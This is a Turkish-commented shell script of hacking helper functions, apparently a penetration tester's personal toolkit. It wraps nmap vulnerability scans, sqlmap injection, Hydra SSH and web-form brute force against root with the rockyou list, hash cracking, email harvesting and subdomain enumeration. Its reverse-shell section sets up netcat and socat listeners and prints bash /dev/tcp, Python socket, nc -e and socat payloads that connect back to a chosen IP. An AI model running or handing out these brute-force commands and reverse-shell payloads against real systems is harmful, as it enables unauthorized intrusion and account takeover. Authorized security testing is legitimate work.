# ╔════════════════════════════════════════════════════════╗
# ║  hacking.sh — Hacking & Security Araçları             ║
# ╚════════════════════════════════════════════════════════╝

WORDLISTS="$HOME/.wordlists"

# ══════════════════════════════════════════════════════════
# 🔍 AĞ TARAMA
# ══════════════════════════════════════════════════════════

# Hızlı tarama
nquick()  { nmap -T4 -F --reason "${1:?host}"; }

# Tam tarama
nfull()   { nmap -T4 -A -v -p- "${1:?host}"; }

# Ping sweep — subnet'teki canlı hostlar
sweep() {
  local net="${1:?Usage: sweep 192.168.1}"
  echo "📡 Taranıyor: ${net}.0/24"
  nmap -sn "${net}.0/24" --reason | grep "Nmap scan report" | \
    awk '{print $NF}' | tr -d '()'
}

# Servis tespiti
nservice() { nmap -sV -sC -p "${2:-1-1000}" "${1:?host}"; }

# Güvenlik açığı tarama
nvuln()   { nmap --script vuln "${1:?host}"; }

# UDP tarama
nudp()    { nmap -sU --top-ports 100 "${1:?host}"; }

# OS tespiti
nos()     { nmap -O --osscan-guess "${1:?host}"; }

# ══════════════════════════════════════════════════════════
# 🌐 WEB TESTI
# ══════════════════════════════════════════════════════════

# HTTP analizi
httpinfo() {
  local url="${1:?Usage: httpinfo <url>}"
  echo "\n── Headers ──────────────────────"
  curl -sI "$url"
  echo "\n── Bağlantı ─────────────────────"
  curl -s -o /dev/null -w "Status:  %{http_code}\nSüre:    %{time_total}s\nBoyut:   %{size_download} bytes\nIP:      %{remote_ip}\n" "$url"
}

# Dizin tarama (wordlist ile)
dirscan() {
  local url="${1:?Usage: dirscan <url>}"
  local wl="${2:-$WORDLISTS/common.txt}"
  [ ! -f "$wl" ] && echo "✗ Wordlist yok: $wl" && return 1
  echo "📂 Dizin taranıyor: $url"
  while read -r word; do
    local code
    code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$word")
    case "$code" in
      200) echo "  ✔ [$code] /$word" ;;
      301|302) echo "  → [$code] /$word" ;;
      403) echo "  🔒 [$code] /$word" ;;
    esac
  done < "$wl"
}

# SQLMap hızlı
sqli() { sqlmap -u "${1:?url}" --batch --level=2 --risk=2; }

# Nikto tarama
niktoscan() { nikto -h "${1:?host}"; }

# SSL sertifika bilgisi
sslinfo() {
  local host="${1:?Usage: sslinfo <host>}"
  echo | openssl s_client -connect "${host}:443" 2>/dev/null | \
    openssl x509 -noout -subject -issuer -dates
}

# ══════════════════════════════════════════════════════════
# 🔑 PAROLA KIRMA
# ══════════════════════════════════════════════════════════

# Hydra SSH brute force
bssh() {
  local host="${1:?Usage: bssh <host> [user] [wordlist]}"
  local user="${2:-root}"
  local wl="${3:-$WORDLISTS/rockyou.txt}"
  hydra -l "$user" -P "$wl" ssh://"$host" -t 4 -V
}

# Hydra HTTP POST brute force
bhttp() {
  local url="${1:?Usage: bhttp <url> <user> <pass-field> <fail-string>}"
  hydra -l "$2" -P "$WORDLISTS/rockyou.txt" "$url" http-post-form "$3:$4"
}

# Hash kır (john)
crackjohn() { john "${1:?hash-file}" --wordlist="${2:-$WORDLISTS/rockyou.txt}"; }

# Hash kır (hashcat)
crackhash() {
  local hash="${1:?Usage: crackhash <hash> [mod]}"
  local mod="${2:-0}"  # 0=MD5, 100=SHA1, 1400=SHA256
  hashcat -m "$mod" "$hash" "$WORDLISTS/rockyou.txt"
}

# Hash tanı
hashid() {
  python3 -c "
h='$1'
l=len(h)
if l==32:   print('MD5')
elif l==40: print('SHA1')
elif l==64: print('SHA256')
elif l==128:print('SHA512')
else:       print('Bilinmiyor (' + str(l) + ' karakter)')
"
}

# ══════════════════════════════════════════════════════════
# 🕵️ OSINT
# ══════════════════════════════════════════════════════════

# Domain hakkında her şey
recon() {
  local d="${1:?Usage: recon <domain>}"
  echo "\n══ RECON: $d ══════════════════════\n"
  echo "── Whois ────────────────────────"
  whois "$d" | grep -E "Registrar:|Creation|Expiry|Name Server" 2>/dev/null
  echo "\n── DNS ──────────────────────────"
  dig A "$d" +short     | sed 's/^/  A:      /'
  dig MX "$d" +short    | sed 's/^/  MX:     /'
  dig NS "$d" +short    | sed 's/^/  NS:     /'
  dig TXT "$d" +short   | sed 's/^/  TXT:    /'
  echo "\n── IP Bilgisi ───────────────────"
  local ip; ip=$(dig A "$d" +short | head -1)
  [ -n "$ip" ] && curl -s "https://ipinfo.io/$ip/json" | \
    jq '{ip,city,region,country,org}' 2>/dev/null
  echo ""
}

# Subdomain tarama
subdomains() {
  local d="${1:?Usage: subdomains <domain>}"
  local wl="${2:-$WORDLISTS/subdomains.txt}"
  [ ! -f "$wl" ] && echo "✗ Wordlist yok: $wl" && return 1
  echo "🔍 Subdomain taranıyor: $d"
  while read -r sub; do
    local ip; ip=$(dig A "${sub}.${d}" +short 2>/dev/null | head -1)
    [ -n "$ip" ] && echo "  ✔ ${sub}.${d} → $ip"
  done < "$wl"
}

# Email harvesting
harvest() { theHarvester -d "${1:?domain}" -b all 2>/dev/null; }

# Shodan sorgula
shodan-ip() { python3 -c "import shodan; api=shodan.Shodan(''); print(api.host('$1'))" 2>/dev/null; }

# ══════════════════════════════════════════════════════════
# 🔄 REVERSE SHELL
# ══════════════════════════════════════════════════════════

# Listener başlat
listen() {
  local port="${1:-4444}"
  echo "👂 Dinleniyor: 0.0.0.0:$port"
  nc -lvnp "$port"
}

# Socat listener (daha stabil)
slisten() {
  local port="${1:-4444}"
  echo "👂 Socat dinleniyor: $port"
  socat TCP-LISTEN:"$port",reuseaddr,fork EXEC:/data/data/com.termux/files/usr/bin/zsh
}

# Reverse shell payload üret
revshell() {
  local ip="${1:?Usage: revshell <ip> <port>}"
  local port="${2:-4444}"
  echo "\n── Bash ─────────────────────────"
  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo "\n── Python ───────────────────────"
  echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  echo "\n── Netcat ───────────────────────"
  echo "nc -e /bin/sh $ip $port"
  echo "\n── Socat ────────────────────────"
  echo "socat TCP:$ip:$port EXEC:/bin/sh"
}

# ══════════════════════════════════════════════════════════
# 🛠️ YARDIMCI
# ══════════════════════════════════════════════════════════
genpass()   { tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c "${1:-32}"; echo; }
urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }
urldecode() { python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"; }
b64e()      { echo -n "$1" | base64; }
b64d()      { echo -n "$1" | base64 -d; }
hexe()      { echo -n "$1" | xxd; }

hashfile() {
  local f="${1:?Usage: hashfile <file>}"
  echo "MD5:    $(md5sum "$f" | cut -d' ' -f1)"
  echo "SHA256: $(sha256sum "$f" | cut -d' ' -f1)"
}
